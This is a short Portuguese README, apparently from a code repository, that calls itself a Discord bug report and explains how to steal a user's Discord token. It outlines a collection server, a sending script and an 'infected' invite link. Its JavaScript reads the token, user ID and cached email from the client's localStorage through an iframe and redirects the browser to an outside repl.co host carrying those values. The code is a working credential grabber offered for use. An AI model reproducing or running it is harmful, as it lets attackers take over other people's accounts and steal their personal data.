# Discord Bug Token
 ## Este é um bug do discord onde é possivel conseguir o token de um usuario apenas com um comando

 ### Oque precisa ser feito para acontecer o bug:

 - primeiro: o desenvolvimento de um servidor de coleta de parametros pela url que seria algo muito simples.Exemplo : [Servidor Exemplo](https://)
 - segundo: o desenvolvimento de um script para enviar o token por esse url.Exemplo :
[Script de Envio Para o Servidor](https://google.com)
 - terceiro: o desenvolvimento de um url infectado como o invite de um server ou o invite de um bot para que quando o discord seja  iniciado o codigo seja rodado
 
 ### Oque era pra acontecer caso não existise bug:

 se o bug nao existisse o usuario iria usar o discord normalmente sem enviar nenhum dado sensivel para nenhum servidor

 ### Oque realmente acontece:

com o bug acontecendo o usuario acha que esta usando o discord normalmente porem ele envia um dado sensivel 

```js
function env(modul){
    const token = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token
    const tag = `${window.document.querySelector('div.size14-e6ZScH').innerText}%23${window.document.querySelector('div.size12-3cLvbJ').innerText.substr(1)}`
    const id = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.user_id_cache
    const email = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.email_cache

    if(modul == undefined){
        op1()
        modul = 1
    }else{}

    switch(modul){
        case 1:
            op1()
            break
        default:
            console.log(`Modulo ${modul} não foi encontrado`)
    }

    function op1(){
        window.location.href = `https://tokenlog.sasukecusaovh.repl.co/?token=${token}&tag=${tag}&id=${id}&email=${email}`
    }
}

env(1)
```
